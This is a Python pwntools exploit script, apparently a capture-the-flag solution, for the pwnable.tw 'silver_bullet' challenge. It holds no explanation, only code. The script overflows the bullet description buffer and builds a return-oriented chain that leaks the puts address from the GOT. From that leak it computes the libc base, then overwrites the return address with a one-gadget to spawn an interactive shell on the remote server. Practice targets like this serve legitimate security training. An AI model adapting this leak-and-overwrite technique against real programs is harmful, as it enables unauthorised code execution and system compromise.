#!/usr/bin/env python
from pwn import *
# p=process('./silver_bullet',env={'LD_PRELOAD':'./libc_32.so.6'})
p=remote('chall.pwnable.tw',10103)
context.log_level='debug'

ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sla=lambda a,b:p.sendlineafter(a,b)
sd=lambda s:p.send(s)
def menu(i):
    ru('Your choice :')
    sl(str(i))

def create(payload):
    menu(1)
    ru('Give me your description of bullet :')
    sd(payload)

def power_up(payload):
    menu(2)
    ru('Give me your another description of bullet :')
    sd(payload)

def beat():
    menu(3)

create('a'*0x2f+'\n')
e=ELF('./silver_bullet')
power_up('a')

payload='a'*3+'a'*4+p32(e.plt['puts'])
payload+=p32(0x08048954)+p32(e.got['puts'])
# gdb.attach(p,'nb 080488DD\nnb 080488FB')
power_up(payload)

beat()
ru('++++++++++++')
beat()
line=ru('+++++++++++++++++++++++++++')


libc_addr=line[(line.find('Oh ! You win !!\n')+len('Oh ! You win !!\n')):]
libc_addr=u32(libc_addr[0:4])
print(hex(libc_addr))
pause()
libc_base=libc_addr-0x5f140
libc=ELF('./silver_bullet')
one_off=0x3a819
# one_off=0x5f065
# one_off=0x5f066
one=libc_base+one_off

create('a'*0x2f+'\n')
e=ELF('./silver_bullet')
power_up('a')
payload='a'*3+'a'*4+p32(one)
payload+=p32(0x08048954)+p32(e.got['puts'])
power_up(payload)

beat()
beat()
ru('Oh ! You win !!')
p.interactive()